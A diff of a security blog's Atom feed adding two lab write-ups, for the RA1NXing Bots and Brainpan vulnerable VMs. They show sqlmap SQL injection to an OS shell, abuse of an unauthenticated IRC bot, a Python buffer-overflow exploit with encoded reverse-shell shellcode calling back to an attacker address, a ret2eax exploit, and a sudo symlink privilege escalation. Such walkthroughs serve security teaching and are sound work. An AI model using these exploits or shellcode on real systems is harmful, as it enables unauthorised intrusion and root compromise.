@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulnhub | forelsec]]></title>
   <link href="http://hatRiot.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-03-03T01:31:34-07:00</updated>
+  <updated>2014-03-03T23:18:38-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,475 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[solving RA1NXing Bots]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots/"/>
+    <updated>2013-07-10T23:31:29-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots</id>
+    <content type="html"><![CDATA[<p><a href="http://vulnhub.com/entry/ra1nxing-bots_1,52/">RA1NXing Bots</a> is a vulnerable image intended to jump start security researches' interest in botnets and their exploitability.  This vulnerable image was brought to us by Brian Wallace (<a href="https://twitter.com/botnet_hunter">@botnet_hunter</a>), a botnet security researcher at Cylance and good friend (and Ballast Security co-founder).  This was a pretty interesting  vulnerable image, and good exposure into the sometimes seedy and malevolent world of botnets.</p>
+
+<p>As such, the iconic nmap:</p>
+
+<p>```</p>
+
+<h1>Nmap 6.25 scan initiated Mon Jul  8 02:08:29 2013 as: nmap -sS -A -T5 -p- -oN bot.scan 192.168.1.198</h1>
+
+<p>Nmap scan report for 192.168.1.198
+Host is up (0.00044s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
+| ssh-hostkey: 1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
+|<em>2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
+80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
+|</em>http-methods: No Allow or Public header in OPTIONS response (status code 302)
+| http-title: Site doesn&rsquo;t have a title (text/html).
+|<em>Requested resource was /index.php?page=main
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|</em>  100000  2,3,4        111/udp  rpcbind
+6667/tcp open  irc     IRCnet ircd
+| irc-info: Server: irc.localhost
+| Version: 2.11.2p2. irc.localhost 000A
+| Lservers/Lusers: 0/3
+| Uptime: 0 days, 0:10:37
+| Source host: 192.168.1.147
+|_Source ident: NONE or BLOCKED
+MAC Address: 08:00:27:4B:51:94 (Cadmus Computer Systems)
+Aggressive OS guesses: Linux 2.6.31 (98%), Linux 2.6.32 &ndash; 2.6.35 (97%), Linux 2.6.32 &ndash; 3.6 (96%), Netgear DG834G WAP or Western Digital WD TV media player (96%), Linux 2.6.17 &ndash; 2.6.36 (96%), Linux 2.6.23 &ndash; 2.6.38 (95%), Linux 2.6.22 (95%), Linux 2.6.18 &ndash; 2.6.21 (95%), AXIS 210A or 211 Network Camera (Linux 2.6) (95%), Linux 2.6.18 &ndash; 2.6.32 (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+
+<p>TRACEROUTE
+HOP RTT     ADDRESS
+1   0.44 ms 192.168.1.198</p>
+
+<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .</p>
+
+<h1>Nmap done at Mon Jul  8 02:08:52 2013 &mdash; 1 IP address (1 host up) scanned in 23.34 seconds</h1>
+
+<p>```</p>
+
+<p>The two services of interest are the HTTP server and IRC.  The web server comprises a few links with some incredibly basic pages, one of which is an obvious front door at first glance:</p>
+
+<p><img class="center <a" src="href="http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg">http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg</a>"></p>
+
+<p>Grabbing the request and handing it off to sqlmap, we quickly have a shell:</p>
+
+<p><code>
+root@jali:~/lib_mysqludf_sys-master# sqlmap -u http://192.168.1.198/index.php?page=login --data 'user=blah&amp;password=blah' -p user --os-shell
+[....]
+[20:33:03] [INFO] the file stager has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpufqvr.php
+[20:33:03] [INFO] the backdoor has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpbqsug.php
+[20:33:03] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell&gt; whoami
+do you want to retrieve the command standard output? [Y/n/a] a
+command standard output:    'www-data'
+os-shell&gt;
+</code></p>
+
+<p>Dumping out the kernel and listening services doesn&rsquo;t give us anything new.  A local mysql database was set up, and the root password was found in <code>/var/www/main.php</code>, but we can&rsquo;t UDF into it due to file restrictions.  Inside the web root is source for the web site, as well as a <code>/var/www/botsources</code>, which includes the source code for the Ra1nX bot.  This source will come in handy as we explore the system more thoroughly.</p>
+
+<p>At the head of the bot we&rsquo;ve got a bunch of parameters defined; including its connection location and port:</p>
+
+<p><code>
+$servers        = "127.0.0.1";
+$ports            = "6667";
+$admins            = "";
+$channels        = "#somechannel";
+$realnames         = "jhl";
+$nicknames         = "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
+$chanpass     = "trolol";
+</code></p>
+
+<p>If we attempt to connect to the IRC server and join the channel, we get <code>Cannot join to channel #somechannel (Bad channel key)</code>, which is the result of an incorrect password.  The source code specifies a password, but it doesn&rsquo;t work.  Could the bot be changed?</p>
+
+<p><img class="center <a" src="href="http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg">http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg</a>"></p>
+
+<p>Looks like some PHP script is being run as root; likely our culprit.  The issue now is communicating with the bot and somehow exploiting it to give us a root shell.  Time to hit that source we grabbed.</p>
+
+<p>As given above, we have a list of nicknames, a channel, server, and password.  The password doesn&rsquo;t work, so we need to figure out another way.  The bot connects to the server using the connection() function, and selects a random nickname/server/port:</p>
+
+<p>```
+   while(!$SOCKET &amp;&amp; ($try &lt;= $maxtryconn)){</p>
+
+<pre><code>    $server = random($servers);
+    $port     = random($ports);
+    $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
+    $GLOBALS['SOCKET']=$SOCKET;
+    $try++;
+    sleep(1);
+}
+if(!$SOCKET) die("Cannot connect to remote host");
+if ($SOCKET){
+    $GLOBALS['ident']     = $ident    = random($nicknames);
+    $GLOBALS['nick']     = $nick     = random($nicknames);
+    $GLOBALS['realname']= $realname    = random($realnames);
+    SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
+    NICK($nick);
+    print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
+    flush();sleep(1);
+}
+</code></pre>
+
+<p>```</p>
+
+<p>Once connected to a server, it begins listening for commands.  Text is read off the socket and sent to the <code>parser</code> function, which then, obviously, parses and acts upon the input.  The interesting bit to us is the following snippet:</p>
+
+<p>```
+  if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }</p>
+
+<pre><code>if($pubcalled){
+    if ($typeMsg=="PRIVMSG" &amp;&amp; $user &amp;&amp; $pubcalled &amp;&amp; $pubcmd) {
+        if(function_exists($pubcmd)){
+            $sender = "PRIVMSG ".$dropMsg." "._;
+            $GLOBALS['sender'] = $sender;
+            $arg = str_replace("\r","",$arg);
+            $arg = str_replace("\n","",$arg);
+            $pubcmd($arg);
+        }
+    }
+}
+</code></pre>
+
+<p>```</p>
+
+<p>Essentially, once parsed, a valid command to the bot appears <code>bot nick | @command | arguments</code>
+It&rsquo;s also of interest that none of this code verifies the authenticity of the request, nor that it&rsquo;s even coming from a channel.  All we need to do, then, is log into the IRC server and iterate through all available nicknames until we find the connected bot.</p>
+
+<p><img class="center <a" src="href="http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg">http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg</a>"></p>
+
+<p>Game over.  Fun image, and looking forward to future botnet scenarios.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[solving brainpan]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/04/03/solving-brainpan/"/>
+    <updated>2013-04-03T00:09:43-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/04/03/solving-brainpan</id>
+    <content type="html"><![CDATA[<p>Brainpan is the brainchild of superkojiman over at vulnhub, and has some pretty interesting (and frustrating)  twists and turns.  This boot2root is more focused on exploitation of 0days in custom written software, with no metasploit modules or google hunting necessary.  With that, the nmap:</p>
+
+<p>```
+root@127:~# nmap -sS -A -p- -T5 192.168.1.110</p>
+
+<p>Starting Nmap 6.25 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2013-03-27 22:06 CDT
+Nmap scan report for brainpan (192.168.1.110)
+Host is up (0.00040s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+|<em>http-title: Site doesn&rsquo;t have a title (text/html).
+| ndmp-version:
+|</em>  ERROR: Failed to get host information from server
+```</p>
+
+<p>Port 10000 just serves up a page about various exploit statistics in web apps, but 9999 serves up a login page:</p>
+
+<p>```
+root@127:~# nc 192.168.1.110 9999
+<em>|                            </em>|                                      <br/>
+<em>|</em>|<em>|    </em>|  <em>|</em>|    <em>|</em>|<em>|      </em>|<em>|</em>|    <em>|</em>|<em>|      </em>|<em>|</em>|  <em>|</em>|<em>|<br/>
+</em>|    <em>|  </em>|<em>|      </em>|    <em>|  </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|
+<em>|    </em>|  <em>|        </em>|    <em>|  </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|
+<em>|</em>|<em>|    </em>|          <em>|</em>|<em>|  </em>|  <em>|    </em>|  <em>|</em>|<em>|      </em>|<em>|</em>|  <em>|    </em>|</p>
+
+<pre><code>                                        _|                          
+                                        _|
+</code></pre>
+
+<p>[<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong> WELCOME TO BRAINPAN </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>_]</p>
+
+<pre><code>                      ENTER THE PASSWORD                              
+
+                      &gt;&gt; whoareyou
+                      ACCESS DENIED
+</code></pre>
+
+<p>root@127:~#
+```</p>
+
+<p>That&rsquo;s it.  I tried a few basic injections and default passwords to no avail.  I fired up DirBuster to see what I could find, and very quickly I stumped onto <code>/bin/</code>, which contained a single file, <code>brainpan.exe</code>.  I loaded this up into a debugger to see what was inside:</p>
+
+<p><img class="center <a" src="href="http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg">http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg</a>"></p>
+
+<p>It appeared that our password was <code>shitstorm</code>, following a strcpy of the incoming buffer.  I fired up the .exe in a VM to see what it did:</p>
+
+<p><img class="center <a" src="href="http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg">http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg</a>"></p>
+
+<p>Looks like this is just a copy of the program that is running in the virtual machine, and according to my registers, vulnerable:</p>
+
+<p><img class="center <a" src="href="http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg">http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg</a>"></p>
+
+<p>So it appears we need to attach to the login form and see if we can get it to explode with shell execution.  I find it interesting that we were given a copy of the file as a exe instead of an ELF, considering what the host is running.</p>
+
+<p>Exploiting this particular binary was not hard, but I ran into an issue that made it more difficult than it should&rsquo;ve been.  This is a very straightforward stack-based buffer overflow, but continually my stack would get corrupted and shift by one or two bytes:</p>
+
+<p><img class="center <a" src="href="http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg">http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg</a>"></p>
+
+<p>To mitigate this, instead of my payload looking like this: <code>[524 bytes of junk | JMP ESP | NOPs | shellcode]</code></p>
+
+<p>I had to jump a little further back to take advantage of some extra instructions: <code>[520 bytes of junk | 4 NOP bytes | PUSH EBP; MOV EBP,ESP JMP ESP | NOPs | shellcode]</code></p>
+
+<p>This aligned my stack properly and allowed me to run a reverse shell.  Here&rsquo;s the exploit:</p>
+
+<p>```
+import socket</p>
+
+<h1>msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.1.74 LPORT=443 R | msfencode -e x86/shikata_ga_nai -t c</h1>
+
+<h1>[*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)</h1>
+
+<p>shell = &ldquo;\xdb\xc8\xbf\x12\xad\xd5\x16\xd9\x74\x24\xf4\x58\x29\xc9\xb1&rdquo;\</p>
+
+<pre><code>    "\x12\x31\x78\x17\x03\x78\x17\x83\xfa\x51\x37\xe3\xcb\x72\x4f"\
+    "\xef\x78\xc6\xe3\x9a\x7c\x41\xe2\xeb\xe6\x9c\x65\x98\xbf\xae"\
+    "\x59\x52\xbf\x86\xdc\x95\xd7\xd8\xb7\x67\x6d\xb1\xc5\x67\x70"\
+    "\xfa\x43\x86\xc2\x9a\x03\x18\x71\xd0\xa7\x13\x94\xdb\x28\x71"\
+    "\x3e\xcb\x07\x05\xd6\x7b\x77\x8b\x4f\x12\x0e\xa8\xdd\xb9\x99"\
+    "\xce\x51\x36\x57\x90";
+</code></pre>
+
+<p>try:</p>
+
+<pre><code>payload = '\x41' * 520        #junk
+payload += '\x90'*4           #ebp
+payload += '\xf0\x12\x17\x31' #push ebp; mov ebp,esp; jmp esp
+payload += '\x90'*50          #nop sled
+payload += shell              #shellcode
+
+s = socket.socket()
+s.connect(('192.168.1.110', 9999))
+s.recv(1024)
+s.send(payload)
+</code></pre>
+
+<p>except Exception, e: print e
+```</p>
+
+<p>I then had a connected shell waiting for me on 192.168.1.74; a bit of enumeration:</p>
+
+<p><code>
+$ whoami  
+puck
+$ uname -a
+Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
+$ id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+$ ls /home/
+anansi
+puck
+reynard
+</code></p>
+
+<p>To ease my curiousity about the ELF/EXE web server running:</p>
+
+<p>```
+$ cat /home/puck/checksrv.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<h1>run brainpan.exe if it stops</h1>
+
+<p>lsof -i:9999
+if [[ $? -eq 1 ]]; then</p>
+
+<pre><code>pid=`ps aux | grep brainpan.exe | grep -v grep`
+if [[ ! -z $pid ]]; then
+    kill -9 $pid
+    killall wineserver
+    killall winedevice.exe
+fi
+/usr/bin/wine /home/puck/web/bin/brainpan.exe &amp;
+</code></pre>
+
+<p>fi</p>
+
+<h1>run SimpleHTTPServer if it stops</h1>
+
+<p>lsof -i:10000
+if [[ $? -eq 1 ]]; then</p>
+
+<pre><code>pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
+if [[ ! -z $pid ]]; then
+    kill -9 $pid
+fi
+cd /home/puck/web
+/usr/bin/python -m SimpleHTTPServer 10000
+</code></pre>
+
+<p>fi
+```</p>
+
+<p>It&rsquo;s not actually an elf, but an exe that&rsquo;s running under WINE.  Another interesting bit:</p>
+
+<p><code>
+$ which gcc
+$ which cc
+$ which gdb
+$ which objdump
+</code></p>
+
+<p>So if we happen to find any more binaries to exploit, we need to hack on it blind.  And in this case&hellip;</p>
+
+<p><code>
+$ find / -perm +6000 -type f -exec ls -ld {} \; &gt; setuid; echo done
+$ cat setuid
+-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
+-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
+-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
+-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
+-rwsr-xr-x 1 root root 39124 Oct  2 17:26 /bin/ping6
+-rwsr-xr-x 1 root root 34780 Oct  2 17:26 /bin/ping
+-rwxr-sr-x 1 root tty 18056 Sep  6  2012 /usr/bin/wall
+-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudo
+-rwxr-sr-x 1 root shadow 45292 Sep  6  2012 /usr/bin/chage
+-rwxr-sr-x 1 root crontab 34784 Jun 14  2012 /usr/bin/crontab
+-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
+-rwxr-sr-x 1 root mail 13944 Jun 14  2012 /usr/bin/dotlockfile
+-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
+-rwxr-sr-x 1 root mlocate 34452 Aug 14  2012 /usr/bin/mlocate
+-rwxr-sr-x 1 root shadow 18128 Sep  6  2012 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 9736 Jun 18  2012 /usr/bin/bsd-write
+-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudoedit
+-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
+-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-lock
+-rwsr-xr-x 1 root root 14020 Oct  2 17:26 /usr/bin/traceroute6.iputils
+-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
+-rwsr-xr-x 1 root lpadmin 13672 Dec  4 09:21 /usr/bin/lppasswd
+-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-touchlock
+-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
+-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
+-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-unlock
+-rwxr-sr-x 1 root ssh 128424 Sep  6  2012 /usr/bin/ssh-agent
+-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
+-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
+**-rwsr-xr-x 1 anansi anansi 8761 Mar  4 11:06 /usr/local/bin/validate**
+-rwsr-xr-- 1 root messagebus 317564 Oct  3 16:00 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 9740 Oct  3 21:46 /usr/lib/pt_chown
+-rwxr-sr-x 1 root shadow 30372 Jul  3  2012 /sbin/unix_chkpwd
+</code></p>
+
+<p>The bolded entry in our list appears to be suid one of the other users, so it&rsquo;s likely we&rsquo;ll need to attack this one.  And, as mentioned earlier, we have zero debugging tools.  To make matters even worse:</p>
+
+<p><code>
+$ cat /proc/sys/kernel/randomize_va_space
+2
+</code></p>
+
+<p>This means full address space layout randomization is enabled.  This should be fun without debugging tools.</p>
+
+<p>One solution (and one my good friend @mulitia used) is to put shellcode into an environmental variable, netcat over a binary for finding its address, then spamming VAS with that address.  This is a brute-force method that works, but in a real environment might not be the most stealthy of ways.  Another way is to make use of a JMP [register] (say, one we control) and move execution to shellcode space.  If we objdump the binary and hunt for JMP, there are none which point to registers.  Another option is CALL, which is essentially a macro to push/jmp:</p>
+
+<p><code>
+root@bt:~/brainpan# objdump -M intel -d validate | grep "call"
+ 8048353:    e8 00 00 00 00           call   8048358 &lt;_init+0xc&gt;
+ 8048369:    e8 1e 00 00 00           call   804838c &lt;__gmon_start__@plt&gt;
+ 804836e:    e8 1d 01 00 00           call   8048490 &lt;frame_dummy&gt;
+ 8048373:    e8 98 02 00 00           call   8048610 &lt;__do_global_ctors_aux&gt;
+ 804841c:    e8 7b ff ff ff           call   804839c &lt;__libc_start_main@plt&gt;
+ 8048468:    ff 14 85 14 9f 04 08     call   DWORD PTR [eax*4+0x8049f14]
+ 80484af:    ff d0                    call   eax
+ 80484f3:    e8 d4 fe ff ff           call   80483cc &lt;printf@plt&gt;
+ 80484ff:    e8 e8 fe ff ff           call   80483ec &lt;exit@plt&gt;
+ 8048511:    e8 96 fe ff ff           call   80483ac &lt;strlen@plt&gt;
+ 8048527:    e8 90 fe ff ff           call   80483bc &lt;strcpy@plt&gt;
+ 8048558:    e8 6f fe ff ff           call   80483cc &lt;printf@plt&gt;
+ 804856c:    e8 5b fe ff ff           call   80483cc &lt;printf@plt&gt;
+ 804857c:    e8 33 ff ff ff           call   80484b4 &lt;validate&gt;
+ 8048593:    e8 44 fe ff ff           call   80483dc &lt;puts@plt&gt;
+ 80485b6:    e8 4f 00 00 00           call   804860a &lt;__i686.get_pc_thunk.bx&gt;
+ 80485c4:    e8 83 fd ff ff           call   804834c &lt;_init&gt;
+ 80485f4:    ff 94 b3 18 ff ff ff     call   DWORD PTR [ebx+esi*4-0xe8]
+ 804862b:    ff d0                    call   eax
+ 8048643:    e8 00 00 00 00           call   8048648 &lt;_fini+0xc&gt;
+ 804864f:    e8 dc fd ff ff           call   8048430 &lt;__do_global_dtors_aux&gt;
+root@bt:~/brainpan#
+</code></p>
+
+<p>Two options here!  Let&rsquo;s see if we control EAX&hellip;</p>
+
+<p>```
+root@bt:~/brainpan# gdb ./validate
+Reading symbols from /root/brainpan/validate&hellip;done.
+(gdb) r $(perl -e &lsquo;print &ldquo;\x41"x120&rsquo;)
+Starting program: /root/brainpan/validate $(perl -e &lsquo;print &rdquo;\x41"x120&rsquo;)
+warning: the debug information found in &ldquo;/lib/ld-2.11.1.so&rdquo; does not match &ldquo;/lib/ld-linux.so.2&rdquo; (CRC mismatch).</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) x/x $eax
+0xffffd3e8:    0x41414141
+(gdb)
+```</p>
+
+<p>Great, we can now leverage a ret2eax attack.  We&rsquo;ll just need to fill up the required 116 bytes prior to the EIP overwrite, then fill that with our CALL EAX:</p>
+
+<p><code>
+$ ./validate $(perl -e 'print "\xbe\x1f\x41\x25\xe8\xd9\xed\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x0c\x83\xc3\x04\x31\x73\x0f\x03\x73\x10\xa3\xd0\x82\x25\x7b\x82\x01\x5f\x13\x99\xc6\x16\x04\x89\x27\x5b\xa3\x4a\x50\xb4\x51\x22\xce\x43\x76\xe6\xe6\x59\x79\x07\xf7\x72\x1b\x6e\x99\xa3\xbf\x11\x16\xd3\x3f\x85\x8b\xaa\xa1\xe4\xac" . "\x90"x44 . "\x2b\x86\x04\x08"')
+$ whoami
+anansi
+</code></p>
+
+<p>Success; another local user.  I&rsquo;d like to briefly note that I had alot of issues getting shellcode to work if it was placed after the NOP sled, as opposed to before.</p>
+
+<p>Now that we&rsquo;ve got our second account, we can hunt around the system in search of more binaries to exploit.  As our prior search discovered, nothing is suid root.  Checking out /home/anansi gives us:</p>
+
+<p><code>
+$ pwd &amp;&amp; ls -lh
+/home/anansi/bin
+total 8.0K
+-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util
+$ ./anansi_util
+Usage: ./anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+</code></p>
+
+<p>I couldn&rsquo;t find any segmentation faults with this, but I did note the following:</p>
+
+<p>```
+$ sudo -l
+Matching Defaults entries for puck on this host:</p>
+
+<pre><code>env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</code></pre>
+
+<p>User puck may run the following commands on this host:</p>
+
+<pre><code>(root) NOPASSWD: /home/anansi/bin/anansi_util
+</code></pre>
+
+<p>```</p>
+
+<p>It would appear we can <code>sudo ./anansi_util</code> without the need for a password.  And we own the binary!</p>
+
+<p><code>
+$ mv anansi_util anansi_util_bkp
+$ ln -s /bin/sh ./anansi_util
+$ ls -lh
+total 8.0K
+lrwxrwxrwx 1 anansi puck      7 Mar 31 15:27 anansi_util -&gt; /bin/sh
+-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util_bkp
+$ sudo ./anansi_util
+$ whoami
+root
+</code></p>
+
+<p>One of the more interesting boot2root&rsquo;s I&rsquo;ve had the privilege of exploiting, and a trend I hope to see continue.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[solving pwn0s v2]]></title>
